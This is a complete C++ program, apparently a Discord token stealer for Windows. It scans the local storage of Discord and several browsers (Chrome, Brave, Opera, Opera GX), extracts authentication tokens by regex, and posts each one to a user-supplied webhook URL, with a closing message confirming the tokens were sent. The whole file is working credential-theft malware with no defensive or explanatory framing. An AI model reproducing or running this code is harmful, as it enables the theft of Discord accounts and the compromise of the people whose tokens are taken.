#include <iostream>
#define CURL_STATICLIB
#include <fstream>
#include <sys/stat.h>
#include <filesystem>
#include <regex>
#include <thread>
#include <curl/curl.h>

const char* webhook_url = "put your webhook url here";

bool has_extension(const std::string& filepath, const std::string& extension) {
	std::filesystem::path path(filepath);
	return path.extension() == extension;
}

bool exists(const std::string& path) {
	struct stat buffer;
	return (stat(path.c_str(), &buffer) == 0);
}

void send_webhook_data(const char* data) {
	CURL* curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

		res = curl_easy_perform(curl);

		if (res != CURLE_OK) {
			std::cerr << "Error trying to perform: " << curl_easy_strerror(res) << std::endl;
		}

		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();
}

std::vector<std::string> find_match(std::string content, std::regex regex) {
	std::vector<std::string> output;

	std::sregex_iterator current(content.begin(), content.end(), regex);
	std::sregex_iterator last;

	while (current != last) {
		std::smatch currentMatch = *current;
		output.push_back(currentMatch.str());
		current++;
	}

	return output;
}

std::vector<std::string> find_paths() {
	std::vector<std::string> targets;

	char* local;
	size_t localLen;
	_dupenv_s(&local, &localLen, "LOCALAPPDATA");

	char* roaming;
	size_t roamingLen;
	_dupenv_s(&roaming, &roamingLen, "APPDATA");

	std::string discordPath = std::string(roaming) + "\\discord\\Local Storage";
	std::string bravePath = std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage";
	std::string operaPath = std::string(roaming) + "\\Opera Software\\Opera Stable\\Default\\Local Storage";
	std::string chromePath = std::string(local) + "\\Google\\Chrome\\User Data\\Default\\Local Storage";
	std::string operaGXPath = std::string(roaming) + "\\Opera Software\\Opera GX Stable\\Local Storage";

	targets.push_back(discordPath);
	targets.push_back(bravePath);
	targets.push_back(operaPath);
	targets.push_back(chromePath);
	targets.push_back(operaGXPath);

	free(local);
	free(roaming);

	return targets;
}

void search_token(const std::string& target, const std::string& path) {
	std::ifstream ifs(path, std::ios_base::binary);
	if (!ifs.is_open()) {
		std::cerr << "Error trying to open path: " << path << std::endl;
		return;
	}

	std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
	ifs.close();

	std::regex reg1(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
	std::regex reg2(R"(mfa\.[\w-]{84})");

	std::vector<std::string> data;

	auto search_and_append = [&data](const std::string& content, const std::regex& reg) {
		auto begin = std::sregex_iterator(content.begin(), content.end(), reg);
		auto end = std::sregex_iterator();
		for (auto i = begin; i != end; ++i) {
			data.push_back(i->str());
		}
	};

	search_and_append(content, reg1);
	search_and_append(content, reg2);

	for (const auto& token : data) {
		std::string combine = "content=";
		combine += "```" + target + ": " + token + "```";

		send_webhook_data(combine.c_str());
	}
}

void find_token(const std::string& path) {
	std::string target = path + "\\leveldb";

	try {
		for (const auto& entry : std::filesystem::directory_iterator(target)) {
			std::string strPath = entry.path().u8string();

			if (has_extension(strPath, ".log")) {
				search_token(target, strPath);
			}

			if (has_extension(strPath, ".ldb")) {
				search_token(target, strPath);
			}
		}
	}
	catch (const std::exception& err) {
		std::cout << "Error trying to get tokens on path: " << path << std::endl;
	}
}

int main(int argc, char* argv[]) {
	std::vector<std::string> paths = find_paths();
	std::vector<std::thread> threads;

	for (int i = 0; i < paths.size(); i++) {
		if (exists(paths[i])) {
			threads.emplace_back(find_token, paths[i]);
		}
	}

	for (auto& t : threads) {
		if (t.joinable()) {
			t.join();
		}
	}

	std::cout << "Tokens have been sent to the webhook." << std::endl;
	std::cin.get();

	return EXIT_SUCCESS;
}
